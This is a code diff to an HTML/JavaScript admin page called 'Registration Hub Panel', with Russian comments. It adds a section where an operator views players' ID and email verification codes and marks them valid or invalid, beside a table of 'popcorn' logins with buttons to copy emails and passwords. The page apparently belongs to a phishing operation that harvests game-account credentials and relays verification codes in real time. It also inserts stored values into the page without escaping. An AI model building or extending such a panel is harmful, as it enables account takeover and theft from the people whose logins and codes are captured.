@@ -189,6 +189,12 @@
       color: var(--text-soft);
     }
 
+    .card-sub {
+      font-size: 8px;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+    }
+
     .pill {
       font-size: 8px;
       padding: 4px 8px;
@@ -348,6 +354,152 @@
       color: #c7d2fe;
     }
 
+    /* GRID для секции кодов */
+
+    .admin-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 10px;
+    }
+
+    @media (max-width: 1024px) {
+      .admin-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .list-empty {
+      font-size: 8px;
+      color: var(--text-muted);
+      padding: 4px 0 2px;
+    }
+
+    .item {
+      border-radius: 16px;
+      border: 1px solid rgba(31,41,55,0.9);
+      padding: 8px 9px 7px;
+      margin-bottom: 7px;
+      background: radial-gradient(circle at top, rgba(15,23,42,0.9), rgba(15,23,42,0.98));
+    }
+
+    .item-header {
+      display: flex;
+      justify-content: space-between;
+      gap: 8px;
+      margin-bottom: 4px;
+    }
+
+    .item-main {
+      font-size: 9px;
+      font-weight: 600;
+      color: var(--text-soft);
+    }
+
+    .item-meta {
+      font-size: 8px;
+      color: var(--text-muted);
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+    }
+
+    .meta-tag {
+      padding: 2px 6px;
+      border-radius: 999px;
+      border: 1px solid rgba(55,65,81,0.8);
+      background: rgba(17,24,39,0.9);
+      font-size: 8px;
+    }
+
+    .status-tag {
+      padding: 2px 6px;
+      border-radius: 999px;
+      font-size: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.14em;
+    }
+
+    .status-tag--pending {
+      border: 1px solid rgba(249,115,22,0.8);
+      color: #fed7aa;
+      background: rgba(249,115,22,0.08);
+    }
+
+    .status-tag--sent {
+      border: 1px solid rgba(56,189,248,0.8);
+      color: #e0f2fe;
+      background: rgba(56,189,248,0.08);
+    }
+
+    .status-tag--valid {
+      border: 1px solid rgba(34,197,94,0.9);
+      color: #bbf7d0;
+      background: rgba(34,197,94,0.14);
+    }
+
+    .status-tag--invalid {
+      border: 1px solid rgba(239,68,68,0.9);
+      color: #fecaca;
+      background: rgba(239,68,68,0.12);
+    }
+
+    .item-row {
+      font-size: 8px;
+      color: var(--text-muted);
+      margin-bottom: 2px;
+    }
+
+    .item-row--code {
+      margin-top: 4px;
+      margin-bottom: 2px;
+      padding: 4px 7px;
+      border-radius: 999px;
+      background: rgba(15,23,42,0.95);
+      border: 1px dashed rgba(148,163,253,0.6);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .code-label {
+      font-size: 7px;
+      text-transform: uppercase;
+      letter-spacing: 0.16em;
+      color: var(--text-muted);
+    }
+
+    .code-pill {
+      padding: 2px 8px;
+      border-radius: 999px;
+      border: 1px solid var(--accent);
+      background: var(--accent-soft);
+      font-size: 9px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      color: var(--accent);
+      white-space: nowrap;
+    }
+
+    .code-pill--email {
+      border-color: rgba(56,189,248,0.9);
+      background: rgba(56,189,248,0.12);
+      color: #e0f2fe;
+    }
+
+    .code-pill--access {
+      border-style: dashed;
+      opacity: 0.9;
+    }
+
+    .item-actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 6px;
+    }
+
     .footer {
       margin-top: 18px;
       padding: 12px 0 18px;
@@ -394,6 +546,8 @@
   <!-- MAIN -->
   <main>
     <div class="inner">
+
+      <!-- REGISTRATIONS TABLE -->
       <section>
         <div class="section-title">
           <span class="bar"></span>Registrations & Popcorn
@@ -403,8 +557,8 @@
           и “попкорн”-логины (flow <strong>popcorn</strong>).
           Попкорн можно распознать по <strong>flow = POPCORN</strong> и/или
           <code>ingameId = web-login</code>.  
-          Через действия справа можно <strong>approve / decline</strong> заявку,
-          удалить запись и копировать email / password.
+          Через действия справа можно <strong>approve / decline / delete</strong> заявку
+          и копировать email / password.
         </div>
 
         <div class="card">
@@ -442,29 +596,86 @@
             </table>
           </div>
         </div>
-
       </section>
+
+      <!-- CODES SECTION -->
+      <section style="margin-top:20px;">
+        <div class="section-title">
+          <span class="bar"></span>Verification codes (ID / Email)
+        </div>
+        <div class="section-sub">
+          Здесь отображаются все запросы на коды, которые создаёт форма:<br>
+          <strong>ID verification code</strong> и <strong>Email verification code</strong>.  
+          Админ вручную сверяет коды, которые игрок ввёл, с теми, что он ему выдал,
+          и тут отмечает <strong>VALID / INVALID</strong> или удаляет запрос.
+        </div>
+
+        <div class="admin-grid">
+          <!-- ID CODES -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title">ID verification codes</div>
+              <div class="pill" id="id-count-pill">0 items</div>
+            </div>
+            <div class="card-sub">
+              Создаются, когда игрок нажимает <strong>SEND REQUEST</strong> под ID-кодом.
+              Ты отправляешь ему код (любой канал), он вводит его на сайте,
+              а потом ты здесь отмечаешь, верный он или нет.
+            </div>
+            <div id="id-requests-list"></div>
+          </div>
+
+          <!-- EMAIL CODES -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-title">Email verification codes</div>
+              <div class="pill" id="email-count-pill">0 items</div>
+            </div>
+            <div class="card-sub">
+              Аналогично, но для проверки email.  
+              После того как игрок ввёл код, ты помечаешь его как VALID / INVALID,
+              и результат уходит обратно на сайт в CHECK.
+            </div>
+            <div id="email-requests-list"></div>
+          </div>
+        </div>
+      </section>
+
     </div>
   </main>
 
   <!-- FOOTER -->
   <footer class="footer">
-    REGISTRATION HUB PANEL — internal view for hub & popcorn data. Keep this page private.
+    REGISTRATION HUB PANEL — internal view for hub & popcorn data and verification codes. Keep this page private.
   </footer>
 </div>
 
 <script>
   // ========= CONFIG: совместимо со старым backend =========
-  const API_BASE   = "/admin/api";
-  const STATE_URL  = API_BASE + "/state";                 // GET -> { idCodeRequests, emailCodeRequests, registrations }
-  const APPROVE_URL= API_BASE + "/registration/approve";  // POST -> { id, slot, link, note }
-  const DECLINE_URL= API_BASE + "/registration/decline";  // POST -> { id, reason, note }
-  const DELETE_URL = API_BASE + "/registration/delete";   // POST -> { id }
+  const API_BASE    = "/admin/api";
+  const STATE_URL   = API_BASE + "/state";                 // GET -> { idCodeRequests, emailCodeRequests, registrations }
+  const APPROVE_URL = API_BASE + "/registration/approve";  // POST -> { id, slot, link, note }
+  const DECLINE_URL = API_BASE + "/registration/decline";  // POST -> { id, reason, note }
+  const DELETE_URL  = API_BASE + "/registration/delete";   // POST -> { id }
+
+  const ID_VALID_URL    = API_BASE + "/id-code/mark-valid";
+  const ID_INVALID_URL  = API_BASE + "/id-code/mark-invalid";
+  const ID_DELETE_URL   = API_BASE + "/id-code/delete";
+
+  const EMAIL_VALID_URL   = API_BASE + "/email-code/mark-valid";
+  const EMAIL_INVALID_URL = API_BASE + "/email-code/mark-invalid";
+  const EMAIL_DELETE_URL  = API_BASE + "/email-code/delete";
 
   const tbodyEl    = document.getElementById("logs-tbody");
   const countPill  = document.getElementById("logs-count-pill");
   const globalStatusEl = document.getElementById("global-status");
   const reloadBtn  = document.getElementById("reload-btn");
+
+  // кодовые списки
+  const idListEl       = document.getElementById("id-requests-list");
+  const emailListEl    = document.getElementById("email-requests-list");
+  const idCountPill    = document.getElementById("id-count-pill");
+  const emailCountPill = document.getElementById("email-count-pill");
 
   function setStatus(text, type) {
     globalStatusEl.textContent = text || "";
@@ -500,6 +711,8 @@
     if (!res.ok) throw new Error("HTTP " + res.status);
     try { return await res.json(); } catch { return {}; }
   }
+
+  /* ---------- REGISTRATIONS TABLE ---------- */
 
   function renderRows(items) {
     if (!items || items.length === 0) {
@@ -615,28 +828,6 @@
     tbodyEl.innerHTML = rows;
   }
 
-  async function loadState() {
-    setStatus("Loading registrations…", "");
-    try {
-      const data  = await getJSON(STATE_URL);
-      const items = data && Array.isArray(data.registrations)
-        ? data.registrations
-        : [];
-      renderRows(items);
-      setStatus("Loaded.", "ok");
-    } catch (e) {
-      console.error(e);
-      setStatus("Failed to load state. Check " + STATE_URL, "err");
-      tbodyEl.innerHTML = `
-        <tr>
-          <td colspan="10" style="text-align:center;color:var(--text-muted);padding:10px 0;">
-            Error loading data.
-          </td>
-        </tr>`;
-      countPill.textContent = "0 items";
-    }
-  }
-
   function findRowData(id) {
     const row = tbodyEl.querySelector('tr[data-id="' + id + '"]');
     if (!row) return {};
@@ -728,6 +919,230 @@
       deleteRegistration(id);
     }
   });
+
+  /* ---------- CODE REQUESTS (ID / EMAIL) ---------- */
+
+  function statusBadgeForRequest(status) {
+    const s = (status || "pending").toLowerCase();
+    if (s === "valid")   return '<span class="status-tag status-tag--valid">VALID</span>';
+    if (s === "invalid") return '<span class="status-tag status-tag--invalid">INVALID</span>';
+    if (s === "sent" || s === "code_sent") return '<span class="status-tag status-tag--sent">CODE SENT</span>';
+    return '<span class="status-tag status-tag--pending">PENDING</span>';
+  }
+
+  function renderIdRequests(list) {
+    if (!list || list.length === 0) {
+      idListEl.innerHTML = '<div class="list-empty">No ID verification requests yet.</div>';
+      idCountPill.textContent = "0 items";
+      return;
+    }
+
+    idCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");
+
+    const html = list.map(item => {
+      const created = formatDate(item.createdAt);
+      const status = statusBadgeForRequest(item.status);
+
+      const accessTag = item.accessCode
+        ? `<span class="meta-tag">Access: <span class="code-pill code-pill--access">${item.accessCode}</span></span>`
+        : `<span class="meta-tag">Access: —</span>`;
+
+      const lastCodeLine = item.lastCode
+        ? `<div class="item-row item-row--code">
+             <span class="code-label">ID CODE</span>
+             <span class="code-pill">${item.lastCode}</span>
+           </div>`
+        : "";
+
+      const lastCodeTimeLine = item.lastCodeAt
+        ? `<div class="item-row"><strong>Last check:</strong> ${formatDate(item.lastCodeAt)}</div>`
+        : "";
+
+      return `
+        <div class="item" data-id="${item.id}">
+          <div class="item-header">
+            <div class="item-main">
+              ${item.ingameId || "Unknown ID"}
+            </div>
+            ${status}
+          </div>
+          <div class="item-meta">
+            ${accessTag}
+            <span class="meta-tag">Email: ${item.email || "—"}</span>
+            ${created ? `<span class="meta-tag">${created}</span>` : ""}
+          </div>
+          ${lastCodeLine}
+          ${lastCodeTimeLine}
+          <div class="item-actions">
+            <button class="btn-xs btn-xs--primary"
+                    data-action="mark-id-valid"
+                    data-id="${item.id}">
+              ✔ ID OK
+            </button>
+            <button class="btn-xs btn-xs--danger"
+                    data-action="mark-id-invalid"
+                    data-id="${item.id}">
+              ✕ ID BAD
+            </button>
+            <button class="btn-xs btn-xs--danger"
+                    data-action="delete-id-request"
+                    data-id="${item.id}">
+              🗑 DELETE
+            </button>
+          </div>
+        </div>
+      `;
+    }).join("");
+
+    idListEl.innerHTML = html;
+  }
+
+  function renderEmailRequests(list) {
+    if (!list || list.length === 0) {
+      emailListEl.innerHTML = '<div class="list-empty">No email verification requests yet.</div>';
+      emailCountPill.textContent = "0 items";
+      return;
+    }
+
+    emailCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");
+
+    const html = list.map(item => {
+      const created = formatDate(item.createdAt);
+      const status = statusBadgeForRequest(item.status);
+
+      const accessTag = item.accessCode
+        ? `<span class="meta-tag">Access: <span class="code-pill code-pill--access">${item.accessCode}</span></span>`
+        : `<span class="meta-tag">Access: —</span>`;
+
+      const lastCodeLine = item.lastCode
+        ? `<div class="item-row item-row--code">
+             <span class="code-label">EMAIL CODE</span>
+             <span class="code-pill code-pill--email">${item.lastCode}</span>
+           </div>`
+        : "";
+
+      const lastCodeTimeLine = item.lastCodeAt
+        ? `<div class="item-row"><strong>Last check:</strong> ${formatDate(item.lastCodeAt)}</div>`
+        : "";
+
+      return `
+        <div class="item" data-id="${item.id}">
+          <div class="item-header">
+            <div class="item-main">
+              ${item.email || "Unknown email"}
+            </div>
+            ${status}
+          </div>
+          <div class="item-meta">
+            ${accessTag}
+            ${item.ingameId ? `<span class="meta-tag">ID: ${item.ingameId}</span>` : ""}
+            ${created ? `<span class="meta-tag">${created}</span>` : ""}
+          </div>
+          ${lastCodeLine}
+          ${lastCodeTimeLine}
+          <div class="item-actions">
+            <button class="btn-xs btn-xs--primary"
+                    data-action="mark-email-valid"
+                    data-id="${item.id}">
+              ✔ EMAIL OK
+            </button>
+            <button class="btn-xs btn-xs--danger"
+                    data-action="mark-email-invalid"
+                    data-id="${item.id}">
+              ✕ EMAIL BAD
+            </button>
+            <button class="btn-xs btn-xs--danger"
+                    data-action="delete-email-request"
+                    data-id="${item.id}">
+              🗑 DELETE
+            </button>
+          </div>
+        </div>
+      `;
+    }).join("");
+
+    emailListEl.innerHTML = html;
+  }
+
+  async function handleCodeAction(action, id) {
+    try {
+      let url = "";
+      let payload = { id };
+
+      if (action === "mark-id-valid") {
+        url = ID_VALID_URL;
+      } else if (action === "mark-id-invalid") {
+        url = ID_INVALID_URL;
+      } else if (action === "delete-id-request") {
+        if (!confirm("Delete this ID verification request? This cannot be undone.")) return;
+        url = ID_DELETE_URL;
+      } else if (action === "mark-email-valid") {
+        url = EMAIL_VALID_URL;
+      } else if (action === "mark-email-invalid") {
+        url = EMAIL_INVALID_URL;
+      } else if (action === "delete-email-request") {
+        if (!confirm("Delete this email verification request? This cannot be undone.")) return;
+        url = EMAIL_DELETE_URL;
+      }
+
+      if (!url) return;
+
+      setStatus("Performing action: " + action + "…", "");
+      await postJSON(url, payload);
+      setStatus("Action completed: " + action + ".", "ok");
+      await loadState();
+    } catch (e) {
+      console.error(e);
+      setStatus("Action failed: " + action + ". Check backend logs.", "err");
+    }
+  }
+
+  // делегируем клики по двум спискам кодов
+  [idListEl, emailListEl].forEach(container => {
+    container.addEventListener("click", (e) => {
+      const btn = e.target.closest("button[data-action]");
+      if (!btn) return;
+      const action = btn.getAttribute("data-action");
+      const id     = btn.getAttribute("data-id");
+      if (!action || !id) return;
+      handleCodeAction(action, id);
+    });
+  });
+
+  /* ---------- LOAD STATE ---------- */
+
+  async function loadState() {
+    setStatus("Loading admin state…", "");
+    try {
+      const data = await getJSON(STATE_URL);
+
+      const regs   = Array.isArray(data.registrations)   ? data.registrations   : [];
+      const idReqs = Array.isArray(data.idCodeRequests)  ? data.idCodeRequests  : [];
+      const emReqs = Array.isArray(data.emailCodeRequests) ? data.emailCodeRequests : [];
+
+      renderRows(regs);
+      renderIdRequests(idReqs);
+      renderEmailRequests(emReqs);
+
+      setStatus("State loaded. Use buttons to manage requests.", "ok");
+    } catch (e) {
+      console.error(e);
+      setStatus("Failed to load admin state. Check backend /admin/api/state.", "err");
+
+      tbodyEl.innerHTML = `
+        <tr>
+          <td colspan="10" style="text-align:center;color:var(--text-muted);padding:10px 0;">
+            Error loading registrations.
+          </td>
+        </tr>`;
+      countPill.textContent = "0 items";
+
+      idListEl.innerHTML    = '<div class="list-empty">Error loading ID requests.</div>';
+      emailListEl.innerHTML = '<div class="list-empty">Error loading email requests.</div>';
+      idCountPill.textContent    = "0 items";
+      emailCountPill.textContent = "0 items";
+    }
+  }
 
   reloadBtn.addEventListener("click", () => {
     loadState();
